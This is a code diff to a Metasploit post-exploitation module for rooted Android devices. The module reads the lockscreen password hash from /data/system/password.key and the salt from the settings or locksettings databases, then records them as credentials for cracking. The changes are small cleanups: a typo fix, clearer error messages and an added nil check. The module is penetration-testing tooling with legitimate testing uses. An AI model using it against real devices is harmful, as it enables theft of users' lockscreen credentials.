@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Post
   def run
 
     def read_store_sql(file_name, location)
-      # we need the .db file, as well as the supportinf iles .db-shm and .db-wal as they may contain
+      # we need the .db file, as well as the supporting files .db-shm and .db-wal as they may contain
       # the values we are looking for
       db_loot_name = ''
       ['', '-wal', '-shm'].each do |ext|
@@ -73,15 +73,16 @@ class MetasploitModule < Msf::Post
       fail_with Failure::NoAccess, 'This module requires root permissions.'
     end
 
-    print_status('Attempting to determine unsalted hash')
-    unless file_exist?('/data/system/password.key')
+    print_status('Attempting to determine unsalted hash.')
+    key_file = '/data/system/password.key'
+    unless file_exist?(key_file)
       print_error('No password.key file, no password on device.')
       return
     end
 
-    hash = read_file('/data/system/password.key')
+    hash = read_file(key_file)
     if hash.empty?
-      print_error('Unable to determine hash')
+      print_error("Unable to read #{key_file}, and retrieve hash.")
       return
     end
     store_loot('Key', 'plain/text', session, hash, 'password.key', 'Android password hash key')
@@ -93,16 +94,20 @@ class MetasploitModule < Msf::Post
     if Gem::Version.new(os) < Gem::Version.new('4.3.0')
       # this is untested.
       begin
-        vprint_status('Attempting to load <4.3.0 Android settings file')
+        vprint_status('Attempting to load < 4.3.0 Android settings file')
         db = read_store_sql('settings.db', '/data/data/com.android.providers.settings/databases/settings.db')
+        if db.nil?
+          print_error('Unable to load settings.db file.')
+          return
+        end
         salt = db.execute('SELECT lockscreen.password_salt from secure;')
       rescue SQLite3::SQLException
-        vprint_status('Failed to load old file or find salt value.  Attempting to new Android locksettings file')
+        print_error("Failed to pull salt from database.  Command output: #{salt}")
         return
       end
     else
       begin
-        vprint_status('Attempting to load >=4.3.0 Android settings file')
+        vprint_status('Attempting to load >= 4.3.0 Android settings file')
         db = read_store_sql('locksettings.db', '/data/system/locksettings.db')
         if db.nil?
           print_error('Unable to load locksettings.db file.')
@@ -141,7 +146,7 @@ class MetasploitModule < Msf::Post
     }
     create_credential(credential_data)
 
-    if hash.length > 40
+    if hash.length > 40 # devices other than Samsungs have sha1+md5 combined into a single string
       md5 = hash[40...72]
       md5 = "#{md5}:#{salt}"
       print_good("MD5: #{md5}")
